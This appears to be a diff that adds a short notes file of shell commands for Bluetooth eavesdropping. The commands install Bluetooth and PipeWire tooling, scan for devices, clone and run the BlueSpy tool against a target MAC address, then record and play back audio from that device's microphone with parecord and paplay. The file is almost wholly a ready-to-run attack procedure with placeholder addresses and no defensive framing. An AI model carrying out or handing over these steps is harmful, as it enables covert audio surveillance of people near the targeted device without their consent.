@@ -1,0 +1,15 @@
+sudo apt install bluez*
+sudo apt install blueman
+sudo systemctl enable bluetooth.service
+sudo systemctl start bluetooth.service
+bluetoothctl
+scan on
+sudo apt install pipewire-pulse
+clone 
+git clone https://github.com/TarlogicSecurity/BlueSpy.git
+cd BlueSpy
+python3 BlueSpy.py -a macaddrees
+
+parecord --device=bluez_input.macadderss test.wav
+paplay test.wav
+
